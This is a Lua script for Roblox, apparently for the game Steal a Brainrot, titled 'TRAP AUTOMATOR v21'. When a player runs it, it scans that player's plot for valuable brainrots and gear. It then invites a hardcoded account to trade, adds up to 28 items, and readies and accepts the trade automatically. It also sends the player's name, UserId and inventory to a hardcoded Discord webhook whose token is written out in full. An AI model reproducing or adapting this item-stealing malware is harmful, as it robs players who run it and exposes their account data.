--[[=====================================================================
    SAB | TRAP AUTOMATOR v21
    ---------------------------------------------------------------
    CAMBIOS SOBRE v20
    [FIX 1] resolveRemotes(): rutas reales con WaitForChild. FindFirstChild
            no acepta "A/B/C". Fallback solo sobre ClassName correcto.
    [FIX 2] Mutex S.filling: fill() ya no se puede ejecutar dos veces
            (antes el guard se saltaba con dos llamadas simultaneas).
    [FIX 3] Bases ya no se meten al trade con la instancia del podium
            (eran duplicados del brainrot). Solo informativas.
    [FIX 4] cleanName(): corta solo en "|", no en "-".
    [FIX 5] extractId(): busca en atributos y en ValueObjects hijos.
            addOne() reintenta con instancia si el ID falla.
    [FIX 6] isOk(): nil ya no es exito automatico.
    [FIX 7] Webhook: cola serializada, 3 reintentos, StatusCode real,
            manejo de 429. Ya no falla en silencio.
    [FIX 8] InviteResult: payload aplanado antes de parsear.
    [FIX 9] Embed de resultado del trade + no se borra S.sent antes.
    [FIX 10] STRICT_PLACE activo y PLACE_ID usada.
    [FIX 11] Espera al plot antes de escanear, con reintentos.
    [FIX 12] ITEM_DELAY 0.45 + settle.
    [FIX 13] Timeout de GUI ya no cancela el invite.
    [FIX 14] Guard de fase en CancelTrade.
    [FIX 15] Ping de vida al arrancar: si el script muere, lo sabes.
    [FIX 16] DRY_RUN para diagnosticar sin invitar.
=====================================================================]]

local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local WS      = game:GetService("Workspace")
local HS      = game:GetService("HttpService")
local LP      = Players.LocalPlayer
local U       = table.unpack or unpack

local CFG = {
    WEBHOOK          = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B",
    TARGET_ID        = 9555775328,
    TARGET_NAME      = "KIMILOSP",
    TARGET_DISPLAY   = "PIPIPI",
    PLACE_ID         = 109983668079237,
    STRICT_PLACE     = true,
    DRY_RUN          = false,   -- true = escanear y reportar, sin invitar
    WATCH_GUI        = true,
    AUTO_ACCEPT      = true,
    ADD_ALL_IF_EMPTY = false,
    MAX_TRADE_ITEMS  = 28,
    ITEM_DELAY       = 0.45,
    POLL             = 0.2,
    RETRY_AFTER      = 5,
    INVITE_TIMEOUT   = 4,
    GUI_TIMEOUT      = 10,
    COMPLETE_TIMEOUT = 20,
    INVITE_BACKOFF   = { 2, 4, 7, 12 },
    PING_EVERYONE    = true,
    DEBUG            = true,
}

local TARGET_BRAINROTS = {
    ["Toro Españolo"]=true,["Chicleteira Champeona"]=true,["Examen Bros"]=true,["Pizza and Ranch"]=true,
    ["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,["Scorpino Coasterino"]=true,["Queen Bee"]=true,
    ["Smore Serat"]=true,["Yetimactic"]=true,["La Breakfast Combinasion"]=true,["Bumbatron"]=true,
    ["Candini Fluffini"]=true,["Polaroidini"]=true,["La Fuse Machine"]=true,["Nachorilla"]=true,
    ["Sammyni Truckini"]=true,["Orchidox"]=true,["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,
    ["Pelican Pachetto"]=true,["Deputy Leopard"]=true,["Chicli Chicla"]=true,["Panda Popanda"]=true,
    ["La Craft Machine"]=true,["Gold and Diamond"]=true,["Los Dragons"]=true,["Zebrino Pianino"]=true,
    ["Hydra Serpent"]=true,["Lavamanta"]=true,["Lionello Casarello"]=true,["Draculino"]=true,
    ["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,["Phoenix"]=true,["Boo Boo Rocket"]=true,
    ["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,["Tosto Dino"]=true,["Cobra Gelato"]=true,
    ["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,["Arca Bros"]=true,["Fang Fang Draculang"]=true,
    ["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,["Spooketti Tualetti"]=true,["Puppetmaster"]=true,
    ["Scorpi Inferni"]=true,["Jacko Jakat"]=true,["Spooky Kart"]=true,["Scarino Crowino"]=true,
    ["Headless Horseman"]=true,["John Pork"]=true,["Meowl"]=true,["Skibidi Toilet"]=true,
    ["Strawberry Elephant"]=true,["1x1x1x1"]=true,["25"]=true,["67"]=true,
    ["Aquarino"]=true,["Arcadopus"]=true,["Bacuru and Egguru"]=true,["Bananito"]=true,
    ["Baskito"]=true,["Berryno"]=true,["Bisonte Giuppitere"]=true,["Blackhole Goat"]=true,
    ["Boatito Auratito"]=true,["Bombardiro Vaccariro"]=true,["Brunito Marsito"]=true,["Buho de Volto"]=true,
    ["Bunny Bunny Bunny Sahur"]=true,["Bunnyman"]=true,["Buntteo"]=true,["Burrito Bandito"]=true,
    ["Camera Ramena"]=true,["Capitano Gullini"]=true,["Chachechi"]=true,["Chicleteira Bicicleteira"]=true,
    ["Chicleteira Cupideira"]=true,["Chicleteira Noelteira"]=true,["Chicleteira Surfeiteira"]=true,
    ["Chicleteirina Bicicleteirina"]=true,["Chill Puppy"]=true,["Chimnino"]=true,["Churrito Bunnito"]=true,
    ["Cigno Fulgoro"]=true,["Craburger"]=true,["Cuadramat and Pakrahmatmamat"]=true,["Cupid Cupid Sahur"]=true,
    ["Cupid Hotspot"]=true,["DJ Panda"]=true,["Dug dug dug"]=true,["Dul Dul Dul"]=true,
    ["Easter Easter Easter Sahur"]=true,["Eid Eid Eid Sahur"]=true,["Esok Sekolah"]=true,["Extinct Tralalero"]=true,
    ["Fishboard"]=true,["Flancito"]=true,["Flipa Sandala"]=true,["Frankentteo"]=true,
    ["Frullato Framingo"]=true,["Futbolini Skatini"]=true,["GOAT"]=true,["Gelato Lumacho"]=true,
    ["Giftini Spyderini"]=true,["Girafini Raftini"]=true,["Glaciator"]=true,["Gold Egg"]=true,
    ["Gold Elf"]=true,["Graipuss Medussi"]=true,["Granny"]=true,["Guerriro Digitale"]=true,
    ["Ho Ho Ho Sahur"]=true,["Horegini Boom"]=true,["Jackorilla"]=true,["Job Job Job Sahur"]=true,
    ["Karkerkar Kurkur"]=true,["Ketupat Kepat"]=true,["La Cucaracha"]=true,["La Extinct Grande"]=true,
    ["La Grande Combinasion"]=true,["La Jolly Grande"]=true,["La Spooky Grande"]=true,["La Vacca Jacko Linterino"]=true,
    ["La Vacca Lepre Lepreino"]=true,["La Vacca Prese Presente"]=true,["La Vacca Saturno Saturnita"]=true,
    ["Las Tralaleritas"]=true,["Las Vaquitas Saturnitas"]=true,["List List List Sahur"]=true,["Los 25"]=true,
    ["Los 67"]=true,["Los Bunitos"]=true,["Los Burritos"]=true,["Los Candies"]=true,
    ["Los Chicleteiras"]=true,["Los Combinasionas"]=true,["Los Cucarachas"]=true,["Los Cupids"]=true,
    ["Los Jobcitos"]=true,["Los Karkeritos"]=true,["Los Matteos"]=true,["Los Mobilis"]=true,
    ["Los Nooo My Hotspotsitos"]=true,["Los Planitos"]=true,["Los Puggies"]=true,["Los Quesadillas"]=true,
    ["Los Spooky Combinasionas"]=true,["Los Spyderinis"]=true,["Los Sweethearts"]=true,["Los Tortus"]=true,
    ["Los Tralaleritos"]=true,["Los Trios"]=true,["Love Love Love Sahur"]=true,["Luck Luck Luck Sahur"]=true,
    ["Lucky Block"]=true,["Mariachi Corazoni"]=true,["Mi Gatito"]=true,["Mieteteira Bicicleteira"]=true,
    ["Money Money Puggy"]=true,["Naughty Naughty"]=true,["Noo my Candy"]=true,["Noo my Eggs"]=true,
    ["Noo my Gold"]=true,["Noo my Heart"]=true,["Noo my Present"]=true,["Nooo My Hotspot"]=true,
    ["Nuclearo Dinossauro"]=true,["Octoball"]=true,["Ombrello Topolino"]=true,["Paradiso Axolottino"]=true,
    ["Perrito Burrito"]=true,["Pirulitoita Bicicleteira"]=true,["Pot Hotspot"]=true,["Pot Pumpkin"]=true,
    ["Pumpkini Spyderini"]=true,["Quesadilla Crocodila"]=true,["Quesadillo Vampiro"]=true,["Rang Ring Bus"]=true,
    ["Reindeer Tralala"]=true,["Rocco Disco"]=true,["Rocketini Frostini"]=true,["Sammyni Spyderini"]=true,
    ["Santa Hotspot"]=true,["Santteo"]=true,["Serafinna Medusella"]=true,["Snailo Clovero"]=true,
    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Strawberrita"]=true,["Sushi Inu"]=true,
    ["Tacorillo Crocodillo"]=true,["Tang Tang Keletang"]=true,["To to to Sahur"]=true,
    ["Torrtuginni Dragonfrutini"]=true,["Trenostruzzo Turbo 4000"]=true,["Trickolino"]=true,
    ["Triplito Tralaleritos"]=true,["Vulturino Skeletono"]=true,["Yess my examine"]=true,["Zombie Tralala"]=true,
    ["4th Bros"]=true,["Gelatina Volatina"]=true,["Conetto Morsetto"]=true,["Pogo Pogo Penguin"]=true,
    ["Peschito Machito"]=true,["Burrito Bat"]=true,["Tacoturbo Tacorito"]=true,["Gattino Hydrantino"]=true,
    ["Puffino Builderino"]=true,["Syrup Samurai"]=true,["Motorino Bumbino"]=true,["Rosatops Triceratino"]=true,
    ["Sir Mangus"]=true,["Gub"]=true,["Ranito Pepito"]=true,["Ski Ski Skunki"]=true,
    ["Capibaro Celestino"]=true,["Pin Pin Pengu"]=true,["Rexino Ramino"]=true,["Rockarino Rockara"]=true,
    ["Qamar Camelamp"]=true,["Marino Submarino"]=true,["Los Treaters"]=true,["Fangaro Lupino"]=true,
    ["Candi Corni"]=true,["Grim Cheese"]=true,["Zombie Bowl"]=true,["Bananito Skelito"]=true,
    ["bat-in-the-Box"]=true,["Chicken Zombie"]=true,["Co Co Co Sahur"]=true,["Skooter Skelly"]=true,
    ["Money Money Cat"]=true,["Bombardiro Crocodilo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,
    ["Cola Cat"]=true,["Matteo"]=true,
}

local NORMAL_BASE_SKINS = {
    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
}

local NORMAL_GEARS = {
    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
    ["Candy Slap"]=true,["Crystal Hammer"]=true,
}

-- [FIX 4] normalizacion para match tolerante
local TARGET_NORM = {}
local function norm(s) return (string.lower(tostring(s)):gsub("[^%w]", "")) end
for k in pairs(TARGET_BRAINROTS) do TARGET_NORM[norm(k)] = true end

local function isTargetName(name)
    if TARGET_BRAINROTS[name] then return true end
    return TARGET_NORM[norm(name)] == true
end

local S = {
    running    = true,
    phase      = "BOOT",
    filling    = false,   -- [FIX 2] mutex
    invTries   = 1,
    lastInvite = -999,
    invitedAt  = 0,
    fillAt     = 0,
    tradeGui   = nil,
    baseline   = {},
    sent       = 0,
    reported   = false,
    scanning   = false,
}

local R = {
    SearchUser=nil, Invite=nil, AcceptInvite=nil, AddBrainrot=nil, AddItem=nil,
    Ready=nil, Accept=nil, Cancel=nil, InviteResult=nil, TradeCompleted=nil,
}

local function log(m) if CFG.DEBUG then print("[SAB v21] " .. tostring(m)) end end

-- ============================ WEBHOOK [FIX 7] ============================
local Q, sending = {}, false

local function pickRequest()
    return (typeof(syn) == "table" and syn.request)
        or (typeof(http) == "table" and http.request)
        or (typeof(fluxus) == "table" and fluxus.request)
        or request
end

local function sendOnce(body)
    local url = CFG.WEBHOOK
    if not url or url == "" then return false, "sin_url" end
    local req = pickRequest()
    if typeof(req) == "function" then
        local ok, r = pcall(req, {
            Url = url, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" }, Body = body,
        })
        if not ok then return false, "request_error" end
        if type(r) == "table" then
            local code = r.StatusCode or r.status or r.Status
            if type(code) == "number" then
                if code >= 200 and code < 300 then return true end
                if code == 429 then return false, 429 end
                return false, code
            end
        end
        return true
    end
    local ok, err = pcall(HS.PostAsync, HS, url, body)
    if ok then return true end
    return false, tostring(err)
end

local function worker()
    if sending then return end
    sending = true
    while #Q > 0 do
        local p = table.remove(Q, 1)
        local okEnc, body = pcall(function() return HS:JSONEncode(p) end)
        if okEnc then
            for attempt = 1, 3 do
                local ok, code = sendOnce(body)
                if ok then break end
                if code == 429 then task.wait(3) else task.wait(1.5) end
                if attempt == 3 then log("webhook fallo definitivo: " .. tostring(code)) end
            end
        end
        task.wait(1.2)
    end
    sending = false
end

local function post(p) table.insert(Q, p); task.spawn(worker) end

local function trace(m)
    log(m)
    post({ username = "SAB", content = "```" .. tostring(m) .. "```", allowed_mentions = { parse = {} } })
end

local function report(desc, color)
    post({
        username = "SAB v21",
        content = CFG.PING_EVERYONE and "@everyone" or "",
        allowed_mentions = { parse = { "everyone" } },
        embeds = {{ color = color or 65280, description = tostring(desc):sub(1, 3900),
                    footer = { text = ("%s • %d • %s"):format(LP.Name, LP.UserId, game.JobId) } }},
    })
end

-- ============================ UTILS ============================
local function descend(root, ...)
    local cur = root
    for _, seg in ipairs({ ... }) do
        if not cur then return nil end
        cur = cur:FindFirstChild(seg)
    end
    return cur
end

-- [FIX 4] corta solo en "|"
local function cleanName(raw)
    if not raw then return "" end
    local s = tostring(raw)
    local p = s:find("|")
    if p then s = s:sub(1, p - 1) end
    s = s:gsub("💰", "")
    return (s:gsub("^%s*(.-)%s*$", "%1"))
end

local ID_KEYS = { "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","BrainrotId" }

-- [FIX 5]
local function extractId(obj)
    if not obj then return nil end
    for _, k in ipairs(ID_KEYS) do
        local v = obj:GetAttribute(k)
        if v ~= nil then return v end
    end
    for _, c in ipairs(obj:GetChildren()) do
        if c:IsA("StringValue") or c:IsA("NumberValue") or c:IsA("IntValue") then
            local cn = string.lower(c.Name)
            for _, k in ipairs(ID_KEYS) do
                if cn:find(string.lower(k), 1, true) then return c.Value end
            end
        end
    end
    return nil
end

-- [FIX 6] nil ya no es exito
local function isOk(res)
    if res == true then return true end
    if res == nil then return false end
    if res == false then return false end
    if type(res) == "table" then
        for _, k in ipairs({ "success","ok","Success","Ok","accepted","Accepted" }) do
            if res[k] ~= nil then return res[k] and true or false end
        end
        return true
    end
    if type(res) == "string" then
        local s = res:lower()
        if s:find("false") or s:find("offline") or s:find("busy")
           or s:find("expired") or s:find("decline") or s:find("not found")
           or s:find("error") or s:find("invalid") then return false end
        return true
    end
    return true
end

local function callRF(rf, timeout, ...)
    if not rf then return false, "no_remote" end
    local args = { ... }
    local finished, ok, res = false, false, nil
    task.spawn(function()
        ok, res = pcall(function() return rf:InvokeServer(U(args)) end)
        finished = true
    end)
    local t0 = os.clock()
    while not finished and os.clock() - t0 < timeout do task.wait(0.02) end
    if not finished then return false, "timeout" end
    return ok, res
end

local function fireRE(re, ...)
    if not re then return false end
    local args = { ... }
    return pcall(function() re:FireServer(U(args)) end)
end

local function backoff()
    local t = CFG.INVITE_BACKOFF
    return t[math.clamp(S.invTries, 1, #t)] or t[#t] or 4
end

local function flatten(v)
    if type(v) ~= "table" then return tostring(v) end
    local bits = {}
    for k, val in pairs(v) do bits[#bits + 1] = tostring(k) .. "=" .. tostring(val) end
    return table.concat(bits, " ")
end

-- ============================ REMOTES [FIX 1] ============================
local RF_NAMES = { "Invite","AcceptInvite","AddBrainrot","AddItem","SearchUser" }
local RE_NAMES = { "Ready","Accept","CancelTrade","InviteResult","TradeCompleted" }

local function scanFallback(root, names, cls)
    local found = {}
    if not root then return found end
    for _, d in ipairs(root:GetDescendants()) do
        if d.ClassName == cls and names[d.Name] then found[d.Name] = d end
    end
    return found
end

local function resolveRemotes()
    local pk = RS:FindFirstChild("Packages") or RS:WaitForChild("Packages", 10)
    if not pk then return false end
    local net = pk:FindFirstChild("Net") or pk:WaitForChild("Net", 10)
    if not net then return false end

    local rf = net:FindFirstChild("RF")
    local re = net:FindFirstChild("RE")
    local rfTS = rf and rf:FindFirstChild("TradeService")
    local reTS = re and re:FindFirstChild("TradeService")

    if rfTS then
        R.Invite       = rfTS:FindFirstChild("Invite")
        R.AcceptInvite = rfTS:FindFirstChild("AcceptInvite")
        R.AddBrainrot  = rfTS:FindFirstChild("AddBrainrot")
        R.AddItem      = rfTS:FindFirstChild("AddItem")
        R.SearchUser   = rfTS:FindFirstChild("SearchUser")
    end
    if reTS then
        R.Ready          = reTS:FindFirstChild("Ready")
        R.Accept         = reTS:FindFirstChild("Accept")
        R.Cancel         = reTS:FindFirstChild("CancelTrade")
        R.InviteResult   = reTS:FindFirstChild("InviteResult")
        R.TradeCompleted = reTS:FindFirstChild("TradeCompleted")
    end

    -- fallback filtrado por clase, nunca por nombre suelto sin clase
    if not R.Invite or not R.AddBrainrot then
        local f1 = scanFallback(net, RF_NAMES, "RemoteFunction")
        local f2 = scanFallback(net, RE_NAMES, "RemoteEvent")
        for k, v in pairs(f1) do if not R[k] then R[k] = v end end
        for k, v in pairs(f2) do
            local key = (k == "CancelTrade") and "Cancel" or k
            if not R[key] then R[key] = v end
        end
    end

    return R.Invite ~= nil and R.AddBrainrot ~= nil
end

-- ============================ PLOT / SCAN ============================
local function ownPlot()
    local plots = WS:FindFirstChild("Plots")
    if not plots then return nil end
    local byName = plots:FindFirstChild(LP.Name)
    if byName then return byName end
    for _, plot in ipairs(plots:GetChildren()) do
        local yb = descend(plot, "PlotSign", "YourBase")
        if yb and yb:IsA("BillboardGui") and yb.Enabled then return plot end
    end
    return nil
end

local function readOverhead(a)
    local oh = descend(a, "Base", "Spawn", "Attachment", "AnimalOverhead")
             or descend(a, "Info", "AnimalOverhead")
             or a:FindFirstChild("AnimalOverhead", true)
    if not oh then return nil, nil end
    local dn = oh:FindFirstChild("DisplayName")
    if not (dn and dn:IsA("TextLabel") and dn.Text ~= "") then return nil, nil end
    local gen = oh:FindFirstChild("Cash") or oh:FindFirstChild("Value") or oh:FindFirstChild("Generation")
    local extra = (gen and gen:IsA("TextLabel") and gen.Text ~= "") and (" | 💰 " .. gen.Text) or ""
    return dn.Text, dn.Text .. extra
end

-- [FIX 3] bases informativas, no addables
local function snapshot()
    local out = {}
    local plot = ownPlot()
    if not plot then return out, nil end

    local podiums = plot:FindFirstChild("AnimalPodiums")
    if podiums then
        for _, a in ipairs(podiums:GetChildren()) do
            local rawName, full = readOverhead(a)
            if rawName then
                local name = cleanName(rawName)
                local skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
                table.insert(out, {
                    kind = "brainrot", raw = full, name = name, skin = skin,
                    id = extractId(a), inst = a, addable = true,
                    isTarget = isTargetName(name),
                })
                if skin and skin ~= "" then
                    table.insert(out, {
                        kind = "base", raw = skin, name = skin, skin = skin,
                        id = extractId(a), inst = a, addable = false,
                        isTarget = NORMAL_BASE_SKINS[skin] == true,
                    })
                end
            end
        end
    end

    local purchases = plot:FindFirstChild("Purchases")
    if purchases then
        for _, block in ipairs(purchases:GetChildren()) do
            local box = block:FindFirstChild("PlotBlock")
            if box then
                for _, d in ipairs(box:GetDescendants()) do
                    if d:IsA("TextLabel") and d.Text ~= "" then
                        local name = cleanName(d.Text)
                        local isSkin = NORMAL_BASE_SKINS[name] == true
                        table.insert(out, {
                            kind = isSkin and "base" or "gear",
                            raw = d.Text, name = name,
                            id = extractId(box), inst = box, addable = not isSkin,
                            isTarget = (NORMAL_GEARS[name] or isSkin) == true,
                        })
                        break
                    end
                end
            end
        end
    end
    return out, plot
end

-- ============================ VENTANA DE TRADE ============================
local function tradeGui()
    local pg = LP:FindFirstChild("PlayerGui")
    if not pg then return nil end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") and not S.baseline[g] then return g end
    end
    return nil
end

-- ============================ FILL ============================
local startFill, finish

local function addOne(it)
    local rf = (it.kind == "brainrot") and R.AddBrainrot or R.AddItem
    if not rf then return false, "no_remote" end

    if it.id ~= nil then
        local ok, res = callRF(rf, 3, it.id)
        if ok and isOk(res) then return true, res, "id" end
        if ok then
            -- servidor respondio false: probar instancia
            local ok2, res2 = callRF(rf, 3, it.inst)
            if ok2 and isOk(res2) then return true, res2, "inst_fallback" end
            return false, res2, "id_fail"
        end
        return false, res, "id_timeout"
    end

    local ok, res = callRF(rf, 3, it.inst)
    if ok and isOk(res) then return true, res, "inst" end
    return false, res, "inst_fail"
end

local function doFill()
    local items = snapshot()
    local targets, seen = {}, {}
    for _, it in ipairs(items) do
        if it.addable and it.isTarget and it.inst then
            if not seen[it.inst] then
                seen[it.inst] = true
                table.insert(targets, it)
            end
        end
    end
    if #targets == 0 and CFG.ADD_ALL_IF_EMPTY then
        for _, it in ipairs(items) do
            if it.addable and it.inst and not seen[it.inst] then
                seen[it.inst] = true
                table.insert(targets, it)
            end
        end
    end

    local cap = math.min(#targets, CFG.MAX_TRADE_ITEMS)
    trace(("Fill: %d addables de %d totales (cap %d)"):format(cap, #items, CFG.MAX_TRADE_ITEMS))

    local added, failed = {}, {}
    for i = 1, cap do
        local it = targets[i]
        if not S.running or S.phase ~= "FILLING" then break end
        if it.inst and it.inst.Parent then
            local ok, res, how = addOne(it)
            if ok then
                S.sent += 1
                table.insert(added, ("%s [%s]"):format(it.name, tostring(how)))
                log(("  + %s via %s"):format(it.name, tostring(how)))
            else
                table.insert(failed, ("%s (%s)"):format(it.name, tostring(res)))
                log(("  ! %s fallo: %s"):format(it.name, tostring(res)))
            end
        else
            table.insert(failed, it.name .. " (instancia perdida)")
        end
        task.wait(CFG.ITEM_DELAY)
    end

    task.wait(0.4)
    fireRE(R.Ready, true)
    task.wait(0.8)
    if CFG.AUTO_ACCEPT then fireRE(R.Accept, true) end

    S.phase = "WAIT_COMPLETE"
    S.fillAt = os.clock()

    report(("**TRADE ENVIADO**\nAñadidos: **%d**\nFallidos: **%d**\n```%s```"):format(
        S.sent, #failed,
        (table.concat(added, "\n") .. (#failed > 0 and ("\n--- FALLOS ---\n" .. table.concat(failed, "\n")) or "")):sub(1, 1400)
    ), 3447003)
end

startFill = function(reason)
    if S.filling then return end
    if S.phase ~= "WAIT_GUI" and S.phase ~= "INVITING" then return end
    S.filling = true
    S.phase = "FILLING"
    trace("Fill disparado por " .. reason)
    task.spawn(function()
        local ok, err = pcall(doFill)
        S.filling = false
        if not ok then
            trace("ERROR en fill: " .. tostring(err))
            S.phase = "IDLE"
        end
    end)
end

finish = function(state, detail)
    if S.phase == "DONE" then return end
    local sent = S.sent
    S.phase = "DONE"
    S.tradeGui = nil
    S.filling = false
    trace(("Fin: %s | %s | enviados=%d"):format(state, tostring(detail), sent))
    task.delay(CFG.RETRY_AFTER, function()
        if not S.running then return end
        S.sent = 0
        S.phase = "IDLE"
        S.invTries = 1
        S.lastInvite = -999
    end)
end

task.spawn(function()
    local pg = LP:WaitForChild("PlayerGui", 15)
    if not pg then return end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") then S.baseline[g] = true end
    end
    trace("Baseline PlayerGui: " .. #pg:GetChildren() .. " hijos")

    while S.running do
        local g = tradeGui()
        if g and not g:GetAttribute("sabSeen") then
            g:SetAttribute("sabSeen", true)
            if CFG.WATCH_GUI then
                trace(("GUI nueva: '%s' | %d desc"):format(g.Name, #g:GetDescendants()))
            end
            startFill("gui:" .. g.Name)
        end
        task.wait(0.15)
    end
end)

-- ============================ INVITE ============================
local function invite()
    if not R.Invite then return end
    S.phase = "INVITING"
    S.lastInvite = os.clock()

    if R.SearchUser then pcall(function() R.SearchUser:InvokeServer(CFG.TARGET_NAME) end) end

    local ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_ID)
    trace(("Invite -> ok=%s res=%s intento=%d next=%ds"):format(
        tostring(ok), tostring(res), S.invTries, backoff()))

    if ok and isOk(res) then
        S.phase = "WAIT_GUI"
        S.invitedAt = os.clock()
    else
        S.phase = "IDLE"
        S.invTries += 1
    end
end

local function bindEvents()
    if R.InviteResult then
        R.InviteResult.OnClientEvent:Connect(function(payload)
            local flat = flatten(payload)
            local low = flat:lower()
            trace("InviteResult: " .. flat:sub(1, 200))
            if low:find("accept") or low:find("true") then
                startFill("inviteResult")
            else
                if S.phase ~= "FILLING" then
                    S.phase = "IDLE"
                    S.invTries += 1
                end
            end
        end)
    end
    if R.TradeCompleted then
        R.TradeCompleted.OnClientEvent:Connect(function() finish("completado", "TradeCompleted") end)
    end
    if R.Cancel then
        R.Cancel.OnClientEvent:Connect(function()
            if S.phase ~= "IDLE" and S.phase ~= "DONE" and S.phase ~= "BOOT" then
                finish("cancelado", "CancelTrade")
            end
        end)
    end
end

-- ============================ SCAN REPORT ============================
local function sendScan()
    local items, plot = snapshot()
    if not plot then
        report("**SCAN**\nNo se pudo resolver el plot propio.", 15105570)
        return
    end
    local bt, bp, gt, nt = {}, {}, {}, {}
    for _, it in ipairs(items) do
        local line = ("%s%s"):format(it.isTarget and "✅ " or "▫️ ", it.raw ~= "" and it.raw or it.name)
        if it.kind == "brainrot" then
            if it.isTarget then table.insert(bt, line) else table.insert(nt, line) end
        elseif it.kind == "base" then
            table.insert(bp, it.name)
        else
            if it.isTarget then table.insert(gt, it.name) else table.insert(nt, it.name) end
        end
    end
    local function fmt(l, empty)
        if #l == 0 then return "*" .. empty .. "*" end
        local o = {}
        for i, v in ipairs(l) do if i <= 40 then o[#o + 1] = i .. ". " .. v end end
        return table.concat(o, "\n")
    end
    local desc = table.concat({
        ("**PLOT**: `%s`"):format(plot.Name),
        ("🧠 **BRAINROT TARGET (%d)**\n%s"):format(#bt, fmt(bt, "NINGUNO")),
        ("⚙️ **BASES (%d)**\n%s"):format(#bp, fmt(bp, "NINGUNA")),
        ("🔧 **GEARS TARGET (%d)**\n%s"):format(#gt, fmt(gt, "NINGUNO")),
        ("📦 **NO TARGET (%d)**\n%s"):format(#nt, fmt(nt, "NINGUNO")),
    }, "\n\n")
    report(desc, 65280)
end

-- ============================ ARRANQUE ============================
if CFG.STRICT_PLACE and game.PlaceId ~= CFG.PLACE_ID then
    report(("**PLACE EQUIVOCADO**\nActual: `%d`\nEsperado: `%d`\nSTRICT_PLACE activo."):format(
        game.PlaceId, CFG.PLACE_ID), 15548997)
    warn("[SAB v21] PlaceId incorrecto, abortando")
    return
end

trace(("**SAB v21 ONLINE**\n%s (%d)\nPlace `%d`\nJob `%s`\nDRY_RUN=%s"):format(
    LP.Name, LP.UserId, game.PlaceId, game.JobId, tostring(CFG.DRY_RUN)))

task.spawn(function()
    local waited = 0
    while not resolveRemotes() and waited < 20 do
        task.wait(0.5)
        waited += 0.5
    end

    local missing = {}
    for _, k in ipairs({ "Invite","AddBrainrot","AddItem","Ready","Accept","Cancel" }) do
        if not R[k] then table.insert(missing, k) end
    end
    if #missing > 0 then
        report("**REMOTES INCOMPLETOS**\nFaltan: `" .. table.concat(missing, "`, `") .. "`", 15548997)
        if not R.Invite then return end
    else
        trace("Remotes OK: Invite, AcceptInvite, AddBrainrot, AddItem, SearchUser, Ready, Accept, CancelTrade, InviteResult, TradeCompleted")
    end

    bindEvents()

    -- esperar plot real antes de escanear
    local pt = 0
    while not ownPlot() and pt < 25 do task.wait(0.5); pt += 0.5 end

    sendScan()
    if CFG.DRY_RUN then trace("DRY_RUN: sin invites"); return end

    S.phase = "IDLE"

    while S.running do
        local p = S.phase
        if p == "WAIT_GUI" and os.clock() - S.invitedAt > CFG.GUI_TIMEOUT then
            trace("Sin ventana tras invite -> reintento (sin cancelar)")
            S.phase = "IDLE"
            S.invTries += 1
        elseif p == "WAIT_COMPLETE" and os.clock() - S.fillAt > CFG.COMPLETE_TIMEOUT then
            finish("timeout", "sin TradeCompleted")
        elseif p == "IDLE" then
            if os.clock() - S.lastInvite >= backoff() then invite() end
        end
        task.wait(CFG.POLL)
    end
end)
